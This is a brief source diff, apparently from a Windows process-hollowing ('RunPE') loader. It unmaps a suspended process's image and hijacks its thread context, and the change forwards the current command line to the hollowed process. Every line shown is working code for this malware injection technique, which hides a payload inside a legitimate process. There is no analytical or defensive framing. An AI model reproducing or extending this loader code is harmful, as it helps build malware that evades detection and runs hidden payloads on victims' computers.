@@ -42,7 +42,8 @@
 		PCONTEXT CTX;              			// Context Frame
 		PDWORD dwImageBase;        			
 		NtUnmapViewOfSection xNtUnmapViewOfSection;
-		LPVOID pImageBase;         
+		LPVOID pImageBase;
+		LPTSTR commandLine;
 		int Count;
 		
 		IDH = PIMAGE_DOS_HEADER(pFile);
@@ -55,8 +56,9 @@
 				{
 				RtlZeroMemory(&SI, sizeof(SI));
 				RtlZeroMemory(&PI, sizeof(PI));
+				commandLine = GetCommandLine();
 			
-					if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+					if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
 					{
 					CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
 					CTX->ContextFlags = CONTEXT_FULL;
